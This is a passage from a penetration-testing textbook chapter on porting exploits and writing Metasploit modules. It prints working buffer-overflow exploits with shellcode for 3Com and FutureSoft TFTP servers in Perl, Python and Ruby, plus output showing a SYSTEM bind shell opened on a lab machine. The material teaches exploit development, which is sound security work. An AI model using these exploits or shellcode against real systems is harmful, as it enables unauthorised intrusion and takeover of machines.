PeerPort=>$ARGV[1])
or die "Cannot connect to $ARGV[0] on port $ARGV[1]";
my($shellcode) = u
"\xda\xc5\xd9\x74\x24\xf4\x5f\xb8\xd4\x9d\x5d\x7a\x29\xc9" .
--snip--
"\x27\x92\x07\x7e";
print "++ Building Malicious Packet .....\n";
$padding="A" x 105; v
$jmp_xp = "\x4E\xAE\x45\x7E";w# jmp esi user32.dll windows xp sp3 english
$exploit = "\x00\x02"; #write request (header)
$exploit=$exploit."A"; #file name
$exploit=$exploit."\x00"; #Start of transporting name
$exploit=$exploit.$shellcode; #shellcode
$exploit=$exploit.$padding; #padding
$exploit=$exploit.$jmp_xp; #jump to shellcode
$exploit=$exploit."\x00"; #end of TS mode name
print $target $exploit; #Attack on victim
print "++ Exploit packet sent ...\n";
print "++ Done.\n";
print "++ Telnet to 4444 on victim's machine ....\n";
sleep(2);
close($target);
exit;
#----------------------------------------------------------------------------------------------
# milw0rm.com [2007-02-28]
Listing 19-6: The ported exploit
Fuzzing, Porting Exploits, and Metasploit Modules 431
Our ported exploit will look like Listing 19-6, with the shellcode u,
padding v, and return address w adjusted to meet our needs.
If you’ve done everything correctly, when you run the ported exploit, a
bind shell with System privileges will open on TCP port 4444, as shown in
Listing 19-7.
root@kali:~# ./exploitdbexploit.pl 192.168.20.10 69
++ Building Malicious Packet .....
++ Exploit packet sent ...
++ Done.
++ Telnet to 4444 on victim's machine ....
root@kali:~# nc 192.168.20.10 4444
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>
Listing 19-7: Running the ported exploit
writing metasploit modules
Throughout this book we have leveraged many Metasploit modules for
information gathering, exploitation, post exploitation, and so on. As new
vulnerabilities are discovered, Metasploit modules are written for these
issues, often by members of the security community like you. Additionally,
as new post-exploitation or information-gathering techniques are imple-
mented by researchers, they are often ported into Metasploit modules.
In this section, we will look at the basics of writing our own Metasploit
exploit module.
note Metasploit modules are written in Ruby.
The best way to write a Metasploit module is to start with a similar exist-
ing module or skeleton and, similar to what we did in the previous section,
port the exploit to meet our needs. Let’s begin with an existing Metasploit
TFTP exploit module and port the 3Com TFTP stack-based buffer overflow
that we left as an exercise earlier in this chapter. Of course, a Metasploit
module already exists for this vulnerability, but it would be too easy to use
it as a base module.
To see all the exploits for Windows TFTP servers, view the contents of
/usr/share/metasploit-framework/modules/exploits/windows/tftp in Kali.
We’ll start with the module futuresoft_transfermode.rb. This module (shown
in Listing 19-8) exploits a similar issue: a buffer overflow in the transfer
mode field of another piece of TFTP software. We will adapt it for our 3Com
TFTP exploit module.
432 Chapter 19
root@kali:/usr/share/metasploit-framework/modules/exploits/windows/tftp# cat
futuresoft_transfermode.rb
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
class Metasploit3  'FutureSoft TFTP Server 2000 Transfer-Mode Overflow',
'Description' => %q{
This module exploits a stack buffer overflow in the FutureSoft TFTP Server
2000 product. By sending an overly long transfer-mode string, we were able
to overwrite both the SEH and the saved EIP. A subsequent write-exception
that will occur allows the transferring of execution to our shellcode
via the overwritten SEH. This module has been tested against Windows
2000 Professional and for some reason does not seem to work against
Windows 2000 Server (could not trigger the overflow at all).
},
'Author' => 'MC',
'References' =>
[
['CVE', '2005-1812'],
['OSVDB', '16954'],
['BID', '13821'],
['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],
],
'DefaultOptions' =>
{
'EXITFUNC' => 'process',
},
'Payload' =>
{
'Space' => 350, w
'BadChars' => "\x00", x
'StackAdjustment' => -3500, y
},
'Platform' => 'win',
'Targets' => z
[
['Windows 2000 Pro English ALL', { 'Ret' => 0x75022ac4} ], # ws2help.dll
['Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad} ], # ws2help.dll
['Windows NT SP5/SP6a English', { 'Ret' => 0x776a1799} ], # ws2help.dll
['Windows 2003 Server English', { 'Ret' => 0x7ffc0638} ], # PEB return
],
Fuzzing, Porting Exploits, and Metasploit Modules 433
'Privileged' => true,
'DisclosureDate' => 'May 31 2005'))
register_options(
[
Opt::RPORT(69) {
], self.class)
end |
def exploit
connect_udp}
print_status("Trying target #{target.name}...")
sploit = "\x00\x01" + rand_text_english(14, payload_badchars) + "\x00"
sploit += rand_text_english(167, payload_badchars)
seh = generate_seh_payload(target.ret)
sploit[157, seh.length] = seh
sploit += "\x00"
udp_sock.put(sploit) ~
handler
disconnect_udp
end
end
Listing 19-8: Metasploit module example
In the class definition u, as well as the include statements v, the author
of this module tells Metasploit which mixins, or libraries, the module will
inherit constructs from. This is a remote exploit over UDP that uses an SEH
overwrite attack.
In the Payload section w, we tell Metasploit how many bytes we have avail-
able in the attack string for the payload. We also list the bad characters that
need to be avoided x. The StackAdjustment option y tells Metasploit to move
ESP to the beginning of the payload to make more room on the stack for the
payload to do its work without overwriting itself.
In the Targets section z, the author lists all the targets that Metasploit
can attack together with their relevant return addresses. (Note that we
do not have to write return addresses in little-endian format. We will take
care of this later in the module.) In addition to the default options for the
Exploit::Remote::UDP mixin, the author also registered the RPORT option as
69 {, the default port for TFTP. Many programming languages use brackets
to designate blocks such as functions or loops. Python uses indentation, and
Ruby (the language used here) uses the word end | to designate the end of a
block.
434 Chapter 19
The Exploit::Remote::UDP mixin does all the work of setting up a UDP
socket for us. All we need to do is call the function connect_udp }. (You’ll
find the details of connect_udp and other Exploit::Remote::UDP methods at
/usr/share/metasploit-framework/lib/msf/core/exploit/udp.rb in Kali.)
The author then tells Metasploit how to create the exploit string. After
the exploit string is built, the author uses the udp_sock.put method ~ to send
it to the vulnerable server.
A Similar Exploit String Module
The example module uses an SEH exploit, whereas our 3Com TFTP
exploit uses a saved return pointer, so let’s look at the exploit string in
another Metasploit TFTP example for help in creating our exploit. Here
is the exploit string used in the exploit/windows/tftp/tftpd32_long_filename.rb
module.
sploit = "\x00\x01"u + rand_text_english(120, payload_badchars)v + "." +
rand_text_english(135, payload_badchars) + [target.ret].pack('V')w + payload.
encodedx + "\x00"
Recall that the first two bytes of a TFTP packet are the opcode u. Here,
the packet is telling the TFTP we want to read a file. Next is the filename,
rand_text_english(120, payload_badchars). As the module name suggests, rather
than writing too much data into the transport mode field, this exploit uses
a long filename. The author uses Metasploit’s rand_text_english function to
create a 120-character string that avoids any bad characters by pulling from
the BadChar variable earlier in the module v. This exploit seems to require a
period (.) and then some more random text, after which the return address
is added to the string. Metasploit pulls the return address from the ret vari-
able defined earlier in the module.
pack is a Ruby method that turns an array into a binary sequence
according to a template. The 'V' template w directs Ruby to pack our
return address in little-endian format. Following the return address, the
user’s chosen payload is encoded and appended to the exploit string, and
the payload fills the total space allowed, as defined in the Space variable x.
A null byte signals the end of the filename field. (Interestingly, the attack
string does not even need to finish the TFTP packet to exploit the program,
because the mode and final null byte are not appended to the exploit
string.)
Porting Our Exploit Code
Earlier in this chapter, I suggested writing an exploit for the 3Com TFTP
server long transport mode vulnerability as an exercise. Your finished exploit
should be similar to the code shown in Listing 19-9. If you didn’t try writing
this exploit, you should still be able to sort out how the code works, having
worked through the previous examples.
Fuzzing, Porting Exploits, and Metasploit Modules 435
#!/usr/bin/python
import socket
u shellcode = ("\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\
x1d" + "\x4d\x2f\xe8\x83\xeb\xfc\xe2\xf4\xe1\x27\xc4\xa5\xf5\xb4\xd0\x17" +
--snip--
"\x4e\xb2\xf9\x17\xcd\x4d\x2f\xe8")
buffer = shellcode + "A" * 129 + "\xD3\x31\xC1\x77" v
packet = "\x00\x02" + "Georgia" + "\x00" + buffer + "\x00"
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(packet,('192.168.20.10',69))
response = s.recvfrom(2048)
print response
Listing 19-9: Finished 3Com TFTP Python exploit
Your return address may point to another JMP ESI instruction v, and
you may have used a different payload u.
Now let’s port the Python exploit into Metasploit, changing values in
the FutureSoft TFTP example module to fit our needs. We need to make
only a few changes to the existing exploit module we discussed previously,
as shown in Listings 19-10 and 19-11.
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
class Metasploit3  '3com TFTP Long Mode Buffer Overflow',
'Description' => %q{
This module exploits a buffer overflow in the 3com TFTP version 2.0.1 and below with
a long TFTP transport mode field in the TFTP packet.
},
'Author' => 'Georgia',
'References' => v
[
['CVE', '2006-6183'],
['OSVDB', '30759'],
['BID', '21301'],
['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],
],
'DefaultOptions' =>
{
'EXITFUNC' => 'process',
436 Chapter 19
},
'Payload' =>
{
'Space' => 473, w
'BadChars' => "\x00",
'StackAdjustment' => -3500,
},
'Platform' => 'win',
'Targets' =>
[
['Windows XP Pro SP3 English', { 'Ret' => 0x7E45AE4E } ], #JMP ESI USER32.dll x
],
'Privileged' => true,
'DefaultTarget' => 0, y
'DisclosureDate' => 'Nov 27 2006'))
register_options(
[
Opt::RPORT(69)
], self.class)
end
Listing 19-10: Edited module, part 1
Because this is a saved return pointer overwrite exploit, we will
not need to import the SEH Metasploit mixin; we will only import
Msf::Exploit::Remote::Udp u. Next we change the module’s information to
match the 3Com TFTP 2.0.1 long transport mode vulnerability to enable
Metasploit users to search for our module and verify that they have the cor-
rect exploit for the vulnerability. Search vulnerability references online to
find the CVE, OSVDB, and BID numbers, and any other relevant links v.
Next we change the payload options to match our 3Com exploit. In our
Python exploit, we lead with 344 bytes of shellcode, followed by 129 bytes
of padding, giving us a total of 473 bytes to work with for the payload. Tell
Metasploit to create a 473-byte payload at w. For the target section, our
Python exploit covers only one platform, Windows XP Professional SP3
English. If we were submitting our exploit to the Metasploit repositories,
we should try to cover as many exploitable targets as possible.
Finally, change the RET to the JMP ESI in USER32.dll x from the Python
exploit. We’ve also added the DefaultTarget option to tell Metasploit to use
target 0 by default, so the user won’t need to set a target before running the
module y.
The only changes we need to make in the exploit portion of the mod-
ule are to the exploit string itself, as shown in Listing 19-11.